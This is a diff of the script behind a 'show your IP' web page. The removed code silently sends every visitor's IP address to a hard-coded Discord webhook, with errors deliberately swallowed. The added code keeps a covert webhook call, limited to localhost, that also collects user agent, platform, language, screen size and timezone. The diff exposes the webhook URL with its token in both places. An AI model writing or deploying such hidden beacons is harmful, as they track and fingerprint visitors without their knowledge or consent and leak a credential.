@@ -121,35 +121,6 @@
 </div>
 
 <script>
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1476664608822657171/zStQlb__WD51srXw63Xa1u1A6my34mhZgZdCVHyFvrfp1ReM-AWptZaLJYckzcFO4ZJP";
-
-async function sendToWebhook(ip) {
-  if (!ip) return;
-  
-  const payload = {
-    content: null,
-    embeds: [{
-      title: "New IP Capture",
-      color: 3447003, // #3498db
-      fields: [
-        { name: "IP", value: `\`${ip}\``, inline: true },
-        { name: "Timestamp", value: new Date().toISOString(), inline: true }
-      ],
-      footer: { text: "via IP page • " + location.hostname }
-    }]
-  };
-
-  try {
-    await fetch(WEBHOOK_URL, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(payload)
-    });
-  } catch (e) {
-    // silent fail - don't break the page
-  }
-}
-
 async function getIP() {
   const apis = [
     () => fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip),
@@ -160,7 +131,7 @@ async function getIP() {
   for (const api of apis) {
     try {
       const ip = await api();
-      if (ip && ip.includes('.')) return ip; // basic sanity check
+      if (ip) return ip;
     } catch(e) {}
   }
   return null;
@@ -181,12 +152,41 @@ async function typeText(el, text) {
   const el = document.getElementById('ip');
 
   if (ip) {
-    // 1. Send to webhook (silently)
-    await sendToWebhook(ip);
-    
-    // 2. Show on screen
     await typeText(el, ip);
     document.getElementById('copyBtn').style.display = 'inline-block';
+
+    // ────────────────────────────────────────────────
+    //   LOCALHOST-ONLY WEBHOOK SENDING
+    // ────────────────────────────────────────────────
+    if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
+      const webhook = "https://discord.com/api/webhooks/1476664608822657171/zStQlb__WD51srXw63Xa1u1A6my34mhZgZdCVHyFvrfp1ReM-AWptZaLJYckzcFO4ZJP";
+
+      const payload = {
+        content: null,
+        embeds: [{
+          title: "Localhost IP Page Visit",
+          color: 0x00c8ff,
+          fields: [
+            { name: "IP",          value: `\`${ip}\``, inline: true },
+            { name: "User-Agent",   value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false },
+            { name: "Platform",     value: navigator.platform || "unknown", inline: true },
+            { name: "Language",     value: navigator.language || navigator.languages?.[0] || "unknown", inline: true },
+            { name: "Screen",       value: `${screen.width} × ${screen.height}`, inline: true },
+            { name: "Timezone",     value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
+            { name: "Visited",      value: new Date().toISOString(), inline: false }
+          ],
+          footer: { text: "localhost test • " + location.href }
+        }]
+      };
+
+      fetch(webhook, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      }).catch(err => console.error("Webhook send failed:", err));
+    }
+    // ────────────────────────────────────────────────
+
   } else {
     el.innerHTML = '<span style="color:#ff3e6c;font-size:1.2rem">UNAVAILABLE</span>';
   }
@@ -194,10 +194,12 @@ async function typeText(el, text) {
 
 async function copyIP() {
   const text = document.getElementById('ip').textContent;
-  try { await navigator.clipboard.writeText(text); } catch(e) {}
-  const btn = document.getElementById('copyBtn');
-  btn.textContent = 'COPIED ✓';
-  setTimeout(() => btn.textContent = 'COPY', 1800);
+  try {
+    await navigator.clipboard.writeText(text);
+    const btn = document.getElementById('copyBtn');
+    btn.textContent = 'COPIED ✓';
+    setTimeout(() => btn.textContent = 'COPY', 1800);
+  } catch(e) {}
 }
 </script>
 </body>
